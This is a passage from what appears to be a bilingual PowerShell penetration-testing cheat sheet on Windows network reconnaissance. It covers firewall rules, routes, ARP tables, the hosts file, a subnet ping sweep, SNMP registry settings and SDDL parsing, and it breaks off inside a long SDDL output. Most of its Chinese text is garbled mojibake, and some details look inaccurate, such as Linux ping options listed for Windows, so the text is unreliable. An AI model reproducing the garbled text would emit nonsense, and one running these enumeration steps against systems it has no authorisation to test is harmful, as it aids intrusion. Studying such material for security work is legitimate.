Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property  DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}},Profile,Direction,Action
```
### è·¯ç”±

A route is a path that network traffic takes from one network to another. In the context of penetration testing, understanding and manipulating routes can be crucial for gaining access to target systems.

è·¯ç”±æ˜¯ç½‘ç»œæµé‡ä»ä¸€ä¸ªç½‘ç»œåˆ°å¦ä¸€ä¸ªç½‘ç»œçš„è·¯å¾„ã€‚åœ¨æ¸—é€æµ‹è¯•çš„èƒŒæ™¯ä¸‹ï¼Œç†è§£å’Œæ“çºµè·¯ç”±å¯¹äºè·å–ç›®æ ‡ç³»ç»Ÿçš„è®¿é—®æƒé™è‡³å…³é‡è¦ã€‚

#### Route Enumeration

Route enumeration is the process of identifying and gathering information about the routes that exist on a target system. This information can be used to identify potential paths for further exploitation.

è·¯ç”±æšä¸¾æ˜¯è¯†åˆ«å’Œæ”¶é›†ç›®æ ‡ç³»ç»Ÿä¸Šå­˜åœ¨çš„è·¯ç”±ä¿¡æ¯çš„è¿‡ç¨‹ã€‚è¿™äº›ä¿¡æ¯å¯ä»¥ç”¨äºè¯†åˆ«è¿›ä¸€æ­¥åˆ©ç”¨çš„æ½œåœ¨è·¯å¾„ã€‚

#### Route Manipulation

Route manipulation involves modifying the existing routes on a target system to redirect network traffic or gain unauthorized access. This can be done by adding, modifying, or deleting routes.

è·¯ç”±æ“çºµæ¶‰åŠä¿®æ”¹ç›®æ ‡ç³»ç»Ÿä¸Šçš„ç°æœ‰è·¯ç”±ï¼Œä»¥é‡å®šå‘ç½‘ç»œæµé‡æˆ–è·å–æœªç»æˆæƒçš„è®¿é—®æƒé™ã€‚å¯ä»¥é€šè¿‡æ·»åŠ ã€ä¿®æ”¹æˆ–åˆ é™¤è·¯ç”±æ¥å®ç°ã€‚

#### Route Redirection

Route redirection is a technique used to redirect network traffic from its intended destination to a different location. This can be achieved by modifying the routing table on a target system.

è·¯ç”±é‡å®šå‘æ˜¯ä¸€ç§å°†ç½‘ç»œæµé‡ä»å…¶é¢„æœŸç›®çš„åœ°é‡å®šå‘åˆ°å…¶ä»–ä½ç½®çš„æŠ€æœ¯ã€‚å¯ä»¥é€šè¿‡ä¿®æ”¹ç›®æ ‡ç³»ç»Ÿä¸Šçš„è·¯ç”±è¡¨æ¥å®ç°è¿™ä¸€ç‚¹ã€‚

#### Route Poisoning

Route poisoning is a method of manipulating routing tables to misdirect network traffic. By injecting false or malicious routes, an attacker can redirect traffic to a compromised system under their control.

è·¯ç”±æ¯’åŒ–æ˜¯ä¸€ç§é€šè¿‡æ“çºµè·¯ç”±è¡¨æ¥è¯¯å¯¼ç½‘ç»œæµé‡çš„æ–¹æ³•ã€‚é€šè¿‡æ³¨å…¥è™šå‡æˆ–æ¶æ„è·¯ç”±ï¼Œæ”»å‡»è€…å¯ä»¥å°†æµé‡é‡å®šå‘åˆ°ä»–ä»¬æ§åˆ¶çš„å—æŸç³»ç»Ÿã€‚

#### Route Tracing

Route tracing, also known as traceroute, is a technique used to determine the path that network traffic takes from a source to a destination. This can be useful for identifying potential bottlenecks or vulnerabilities in the network.

è·¯ç”±è·Ÿè¸ªï¼Œä¹Ÿç§°ä¸ºtracerouteï¼Œæ˜¯ä¸€ç§ç”¨äºç¡®å®šç½‘ç»œæµé‡ä»æºåˆ°ç›®çš„åœ°çš„è·¯å¾„çš„æŠ€æœ¯ã€‚è¿™å¯¹äºè¯†åˆ«ç½‘ç»œä¸­çš„æ½œåœ¨ç“¶é¢ˆæˆ–æ¼æ´éå¸¸æœ‰ç”¨ã€‚
```powershell
route print
```
### ARP

ARPï¼ˆåœ°å€è§£æåè®®ï¼‰æ˜¯ä¸€ç§ç”¨äºå°†IPåœ°å€æ˜ å°„åˆ°ç‰©ç†MACåœ°å€çš„åè®®ã€‚åœ¨å±€åŸŸç½‘ä¸­ï¼ŒARPè¢«ç”¨äºç¡®å®šç›®æ ‡è®¾å¤‡çš„MACåœ°å€ï¼Œä»¥ä¾¿åœ¨æ•°æ®åŒ…ä¼ è¾“è¿‡ç¨‹ä¸­æ­£ç¡®åœ°å°†æ•°æ®åŒ…å‘é€åˆ°ç›®æ ‡è®¾å¤‡ã€‚

ARPæ¬ºéª—æ˜¯ä¸€ç§åˆ©ç”¨ARPåè®®çš„æ¼æ´æ¥æ¬ºéª—ç½‘ç»œè®¾å¤‡çš„æ”»å‡»æŠ€æœ¯ã€‚æ”»å‡»è€…å¯ä»¥å‘é€è™šå‡çš„ARPå“åº”ï¼Œå°†ç›®æ ‡è®¾å¤‡çš„IPåœ°å€æ˜ å°„åˆ°æ”»å‡»è€…çš„MACåœ°å€ä¸Šã€‚è¿™æ ·ï¼Œæ”»å‡»è€…å°±å¯ä»¥æ‹¦æˆªã€ä¿®æ”¹æˆ–é‡å®šå‘ç›®æ ‡è®¾å¤‡çš„ç½‘ç»œæµé‡ã€‚

åœ¨è¿›è¡ŒARPæ¬ºéª—æ—¶ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šä½¿ç”¨å·¥å…·å¦‚Ettercapã€ARPspoofæˆ–Bettercapæ¥å‘é€è™šå‡çš„ARPå“åº”ã€‚è¿™äº›å·¥å…·å…è®¸æ”»å‡»è€…æ¬ºéª—ç›®æ ‡è®¾å¤‡ï¼Œä½¿å…¶ç›¸ä¿¡æ”»å‡»è€…çš„MACåœ°å€æ˜¯æ­£ç¡®çš„ã€‚

ä¸ºäº†é˜²æ­¢ARPæ¬ºéª—æ”»å‡»ï¼Œå¯ä»¥é‡‡å–ä¸€äº›åŸºæœ¬çš„é˜²å¾¡æªæ–½ï¼Œå¦‚ä½¿ç”¨é™æ€ARPè¡¨ã€å¯ç”¨ARPæ£€æµ‹å’Œé˜²å¾¡å·¥å…·ã€ä½¿ç”¨ç½‘ç»œéš”ç¦»å’Œå®‰å…¨è®¤è¯ç­‰ã€‚è¿™äº›æªæ–½å¯ä»¥å¸®åŠ©ä¿æŠ¤ç½‘ç»œå…å—ARPæ¬ºéª—æ”»å‡»çš„å½±å“ã€‚
```powershell
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```
### ä¸»æœº

The `hosts` file is a plain text file used by operating systems to map hostnames to IP addresses. It is commonly used to block or redirect certain websites or to override DNS settings. As a pentester, you can leverage the `hosts` file to redirect traffic to your own IP address or to bypass DNS resolution.

### ä¸»æœºæ–‡ä»¶

`hosts`æ–‡ä»¶æ˜¯æ“ä½œç³»ç»Ÿä½¿ç”¨çš„çº¯æ–‡æœ¬æ–‡ä»¶ï¼Œç”¨äºå°†ä¸»æœºåæ˜ å°„åˆ°IPåœ°å€ã€‚å®ƒé€šå¸¸ç”¨äºé˜»æ­¢æˆ–é‡å®šå‘ç‰¹å®šçš„ç½‘ç«™ï¼Œæˆ–è€…ç”¨äºè¦†ç›–DNSè®¾ç½®ã€‚ä½œä¸ºæ¸—é€æµ‹è¯•äººå‘˜ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨`hosts`æ–‡ä»¶å°†æµé‡é‡å®šå‘åˆ°è‡ªå·±çš„IPåœ°å€ï¼Œæˆ–è€…ç»•è¿‡DNSè§£æã€‚
```powershell
Get-Content C:\WINDOWS\System32\drivers\etc\hosts
```
### Ping

Pingæ˜¯ä¸€ç§å¸¸ç”¨çš„ç½‘ç»œå·¥å…·ï¼Œç”¨äºæµ‹è¯•ä¸»æœºä¹‹é—´çš„è¿é€šæ€§ã€‚å®ƒé€šè¿‡å‘ç›®æ ‡ä¸»æœºå‘é€ICMPå›æ˜¾è¯·æ±‚å¹¶ç­‰å¾…å›å¤æ¥ç¡®å®šä¸»æœºæ˜¯å¦å¯è¾¾ã€‚Pingå‘½ä»¤é€šå¸¸ç”¨äºè¯Šæ–­ç½‘ç»œé—®é¢˜å’Œæµ‹é‡ç½‘ç»œå»¶è¿Ÿã€‚

ä½¿ç”¨Pingå‘½ä»¤å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

- æ£€æŸ¥ç›®æ ‡ä¸»æœºæ˜¯å¦åœ¨çº¿
- æµ‹è¯•ç½‘ç»œè¿æ¥çš„ç¨³å®šæ€§
- æµ‹é‡ç½‘ç»œå»¶è¿Ÿ
- ç¡®å®šç½‘ç»œä¸­çš„ä¸¢åŒ…ç‡

Pingå‘½ä»¤çš„åŸºæœ¬è¯­æ³•å¦‚ä¸‹ï¼š

```
ping <ç›®æ ‡ä¸»æœº>
```

å…¶ä¸­ï¼Œ`<ç›®æ ‡ä¸»æœº>`æ˜¯è¦æµ‹è¯•è¿é€šæ€§çš„ä¸»æœºçš„IPåœ°å€æˆ–åŸŸåã€‚

Pingå‘½ä»¤ä¼šå‘é€ä¸€ç³»åˆ—ICMPå›æ˜¾è¯·æ±‚åˆ°ç›®æ ‡ä¸»æœºï¼Œå¹¶æ˜¾ç¤ºæ¯ä¸ªè¯·æ±‚çš„å¾€è¿”æ—¶é—´ï¼ˆRTTï¼‰ä»¥åŠä¸¢åŒ…æƒ…å†µã€‚é€šè¿‡è§‚å¯ŸPingå‘½ä»¤çš„è¾“å‡ºï¼Œå¯ä»¥åˆ¤æ–­ç›®æ ‡ä¸»æœºçš„è¿é€šæ€§å’Œç½‘ç»œè´¨é‡ã€‚

Pingå‘½ä»¤è¿˜æ”¯æŒä¸€äº›å¯é€‰å‚æ•°ï¼Œä¾‹å¦‚ï¼š

- `-c <æ¬¡æ•°>`ï¼šæŒ‡å®šå‘é€ICMPè¯·æ±‚çš„æ¬¡æ•°ã€‚
- `-i <é—´éš”>`ï¼šæŒ‡å®šå‘é€ICMPè¯·æ±‚çš„é—´éš”æ—¶é—´ã€‚
- `-s <å¤§å°>`ï¼šæŒ‡å®šICMPè¯·æ±‚çš„æ•°æ®åŒ…å¤§å°ã€‚

ä½¿ç”¨Pingå‘½ä»¤æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š

- Pingå‘½ä»¤éœ€è¦åœ¨å‘½ä»¤è¡Œç•Œé¢ï¼ˆå¦‚Windowsçš„å‘½ä»¤æç¤ºç¬¦æˆ–Linuxçš„ç»ˆç«¯ï¼‰ä¸­æ‰§è¡Œã€‚
- éœ€è¦å…·æœ‰è¶³å¤Ÿçš„ç½‘ç»œæƒé™æ‰èƒ½æ‰§è¡ŒPingå‘½ä»¤ã€‚
- Pingå‘½ä»¤çš„ç»“æœå¯èƒ½å—åˆ°é˜²ç«å¢™æˆ–ç½‘ç»œè®¾å¤‡çš„å½±å“ï¼Œå› æ­¤ç»“æœå¯èƒ½ä¸å‡†ç¡®ã€‚

Pingå‘½ä»¤æ˜¯ç½‘ç»œè¯Šæ–­å’Œæµ‹è¯•ä¸­å¸¸ç”¨çš„å·¥å…·ä¹‹ä¸€ï¼Œå¯¹äºç½‘ç»œç®¡ç†å‘˜å’Œå®‰å…¨ä¸“ä¸šäººå‘˜æ¥è¯´éå¸¸æœ‰ç”¨ã€‚
```powershell
$ping = New-Object System.Net.Networkinformation.Ping
1..254 | % { $ping.send("10.9.15.$_") | select address, status }
```
### SNMP

SNMPï¼ˆSimple Network Management Protocolï¼‰æ˜¯ä¸€ç§ç”¨äºç®¡ç†å’Œç›‘æ§ç½‘ç»œè®¾å¤‡çš„åè®®ã€‚å®ƒå…è®¸ç®¡ç†å‘˜é€šè¿‡å‘é€å’Œæ¥æ”¶æ¶ˆæ¯æ¥è·å–æœ‰å…³è®¾å¤‡çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç³»ç»ŸçŠ¶æ€ã€ç½‘ç»œæµé‡å’Œé”™è¯¯æ—¥å¿—ã€‚SNMPä½¿ç”¨åŸºäºUDPçš„ä¼ è¾“åè®®ï¼Œå¹¶ä½¿ç”¨MIBï¼ˆManagement Information Baseï¼‰æ¥å®šä¹‰è®¾å¤‡ä¸Šå¯ç”¨çš„ä¿¡æ¯ã€‚

#### SNMPçš„å·¥ä½œåŸç†

SNMPçš„å·¥ä½œåŸç†åŸºäºå®¢æˆ·ç«¯-æœåŠ¡å™¨æ¨¡å‹ã€‚ç®¡ç†å‘˜ä½¿ç”¨SNMPç®¡ç†å·¥å…·ä½œä¸ºå®¢æˆ·ç«¯ï¼Œå‘è®¾å¤‡å‘é€è¯·æ±‚ä»¥è·å–ä¿¡æ¯ã€‚è®¾å¤‡ä¸Šè¿è¡Œçš„SNMPä»£ç†ä½œä¸ºæœåŠ¡å™¨ï¼Œæ¥æ”¶å¹¶å“åº”è¿™äº›è¯·æ±‚ã€‚SNMPæ¶ˆæ¯ç”±ç®¡ç†å·¥å…·å’Œä»£ç†ä¹‹é—´é€šè¿‡ç½‘ç»œä¼ è¾“ã€‚

#### SNMPçš„ç‰ˆæœ¬

SNMPæœ‰ä¸‰ä¸ªä¸»è¦ç‰ˆæœ¬ï¼šSNMPv1ã€SNMPv2cå’ŒSNMPv3ã€‚

- SNMPv1æ˜¯æœ€æ—©çš„ç‰ˆæœ¬ï¼Œå…·æœ‰è¾ƒä½çš„å®‰å…¨æ€§å’ŒåŠŸèƒ½ã€‚å®ƒä½¿ç”¨æ˜æ–‡ä¼ è¾“ï¼Œå¹¶ä½¿ç”¨å›ºå®šçš„ç¤¾åŒºå­—ç¬¦ä¸²ä½œä¸ºèº«ä»½éªŒè¯å‡­æ®ã€‚
- SNMPv2cæ˜¯SNMPv2çš„ä¸€ä¸ªç®€åŒ–ç‰ˆæœ¬ï¼Œå¢åŠ äº†ä¸€äº›åŠŸèƒ½ï¼Œä½†ä»ç„¶ä½¿ç”¨æ˜æ–‡ä¼ è¾“å’Œå›ºå®šçš„ç¤¾åŒºå­—ç¬¦ä¸²è¿›è¡Œèº«ä»½éªŒè¯ã€‚
- SNMPv3æ˜¯æœ€æ–°çš„ç‰ˆæœ¬ï¼Œæä¾›äº†æ›´å¼ºçš„å®‰å…¨æ€§å’ŒåŠŸèƒ½ã€‚å®ƒæ”¯æŒåŠ å¯†å’Œèº«ä»½éªŒè¯åè®®ï¼Œå¹¶å…è®¸ç®¡ç†å‘˜å¯¹æ¶ˆæ¯è¿›è¡ŒåŠ å¯†å’Œèº«ä»½éªŒè¯ã€‚

#### SNMPçš„æ”»å‡»æŠ€æœ¯

ç”±äºSNMPçš„æ—©æœŸç‰ˆæœ¬å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œå› æ­¤å®ƒæˆä¸ºé»‘å®¢çš„æ”»å‡»ç›®æ ‡ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸è§çš„SNMPæ”»å‡»æŠ€æœ¯ï¼š

- ç¤¾åŒºå­—ç¬¦ä¸²çŒœæµ‹ï¼šé»‘å®¢å°è¯•çŒœæµ‹è®¾å¤‡ä¸Šä½¿ç”¨çš„SNMPç¤¾åŒºå­—ç¬¦ä¸²ï¼Œä»¥è·å–å¯¹è®¾å¤‡çš„è®¿é—®æƒé™ã€‚
- SNMPæ¼æ´åˆ©ç”¨ï¼šé»‘å®¢åˆ©ç”¨å·²çŸ¥çš„SNMPæ¼æ´æ¥è·å–æœªç»æˆæƒçš„è®¿é—®æƒé™æˆ–æ‰§è¡Œæ¶æ„æ“ä½œã€‚
- SNMPä¿¡æ¯æ³„éœ²ï¼šé»‘å®¢ä½¿ç”¨SNMPåè®®è·å–è®¾å¤‡ä¸Šçš„æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚ç³»ç»Ÿé…ç½®ã€å¯†ç å’Œç½‘ç»œæ‹“æ‰‘ã€‚

#### ä¿æŠ¤SNMP

ä¸ºäº†ä¿æŠ¤SNMPï¼Œç®¡ç†å‘˜å¯ä»¥é‡‡å–ä»¥ä¸‹æªæ–½ï¼š

- ä½¿ç”¨è¾ƒæ–°çš„SNMPç‰ˆæœ¬ï¼Œå¦‚SNMPv3ï¼Œä»¥æä¾›æ›´å¼ºçš„å®‰å…¨æ€§å’ŒåŠŸèƒ½ã€‚
- é…ç½®å¼ºå¯†ç å’Œè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰æ¥é™åˆ¶å¯¹SNMPæœåŠ¡çš„è®¿é—®ã€‚
- å®šæœŸæ›´æ–°è®¾å¤‡ä¸Šçš„SNMPè½¯ä»¶å’Œå›ºä»¶ï¼Œä»¥ä¿®å¤å·²çŸ¥çš„æ¼æ´ã€‚
- ç›‘æ§SNMPæ´»åŠ¨å¹¶è®°å½•æ—¥å¿—ï¼Œä»¥ä¾¿åŠæ—¶æ£€æµ‹å’Œå“åº”æ½œåœ¨çš„æ”»å‡»ã€‚

#### æ€»ç»“

SNMPæ˜¯ä¸€ç§ç”¨äºç®¡ç†å’Œç›‘æ§ç½‘ç»œè®¾å¤‡çš„åè®®ï¼Œä½†å®ƒä¹Ÿå­˜åœ¨å®‰å…¨é£é™©ã€‚ç®¡ç†å‘˜åº”è¯¥é‡‡å–é€‚å½“çš„æªæ–½æ¥ä¿æŠ¤SNMPæœåŠ¡ï¼Œä»¥é˜²æ­¢é»‘å®¢åˆ©ç”¨å…¶è¿›è¡Œæœªç»æˆæƒçš„è®¿é—®å’Œä¿¡æ¯æ³„éœ²ã€‚
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **å°†SDDLå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¯è¯»æ ¼å¼**

To convert the SDDL (Security Descriptor Definition Language) string into a readable format, you can use the `ConvertFrom-SddlString` cmdlet in PowerShell. This cmdlet allows you to parse and interpret the SDDL string, providing a more human-readable output.

```powershell
$sddlString = "D:(A;;GA;;;WD)(A;;GA;;;BA)"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

The `ConvertFrom-SddlString` cmdlet takes the SDDL string as input and returns a `System.Security.AccessControl.CommonSecurityDescriptor` object. This object contains the parsed information from the SDDL string, such as the access control entries (ACEs) and their corresponding permissions.

By running the above code, you will see the converted SDDL string in a readable format, which includes the access control entries and their permissions.

Note: It is important to understand the SDDL format and its components to effectively interpret the converted output.
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da